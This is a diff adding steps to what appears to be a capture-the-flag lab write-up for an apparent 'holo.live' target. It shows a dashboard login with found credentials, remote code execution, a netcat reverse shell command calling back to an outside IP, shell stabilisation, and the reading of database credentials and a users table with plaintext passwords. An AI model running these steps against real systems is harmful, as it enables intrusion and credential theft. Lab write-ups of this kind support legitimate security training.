@@ -95,4 +95,108 @@ I know you forget things, so I'm leaving this note for you:
 admin:DBManagerLogin!
 - gurag <3
 ```
+- Navigate to **http://admin.holo.live/** and log in using the credentials.
+
+![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/3b53ad85-683e-4701-8e50-4d93154e762b)
+
+- Not really find anything interesting in the dashboard, but while looking at the page source, there I found:
+
+![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/b526acda-ecba-49a7-85d6-d82f76a7bc90)
+
+- Maybe it is vulnerable to RCE. On trying I successfully got RCE.
+
+![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/f64348b8-0234-4582-aefc-71c50db05318)
+
+- Time to get the reverse shell on our system. For this I used [PenetstMonekey NetCat Reverse Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
+`nc -e /bin/sh 10.0.0.1 1234`
+
+```bash
+└─$ rlwrap nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.50.109.29] from (UNKNOWN) [10.200.112.33] 54266
+whoami
+www-data
+```
+- In order to make a stable shell we need to run:
+```python3
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+- Background the active shell using ctrl+z and use cmds
+
+```bash
+stty raw -echo
+fg
+
+www-data@40ad97ed7351:/var/www/admin$ whoami
+whoami
+www-data
+```
+- In **www** directory we have our 1st flag
+
+- On further enumeration, I found **"db_connect.php"** file under /var/www/admin directory.
+```bash
+www-data@40ad97ed7351:/var/www/admin$ cat db_connect.php
+cat db_connect.php
+<?php
+
+define('DB_SRV', '192.168.100.1');
+define('DB_PASSWD', "!123SecureAdminDashboard321!");
+define('DB_USER', 'admin');
+define('DB_NAME', 'DashboardDB');
+
+$connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);
+
+if($connection == false){
+
+        die("Error: Connection to Database could not be made." . mysqli_connect_error());
+}
+?>
+```
+- Try to login to the database from inside the container.
+```bash
+$ mysql -u admin -p -h 192.168.100.1
+Enter password: !123SecureAdminDashboard321!
+
+mysql> show databases;
+
++--------------------+
+| Database           |
++--------------------+
+| DashboardDB        |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+
+mysql> use DashboardDB
+
+mysql> show tables;
+show tables;
++-----------------------+
+| Tables_in_DashboardDB |
++-----------------------+
+| users                 |
++-----------------------+
+
+mysql> show columns from users;
+show columns from users;
+
++----------+--------------+------+-----+---------+-------+
+| Field    | Type         | Null | Key | Default | Extra |
++----------+--------------+------+-----+---------+-------+
+| username | varchar(256) | YES  |     | NULL    |       |
+| password | varchar(256) | YES  |     | NULL    |       |
++----------+--------------+------+-----+---------+-------+
+
+mysql> select * from users;
+select * from users;
++----------+-----------------+
+| username | password        |
++----------+-----------------+
+| admin    | DBManagerLogin! |
+| gurag    | AAAA            |
++----------+-----------------+
+```
 
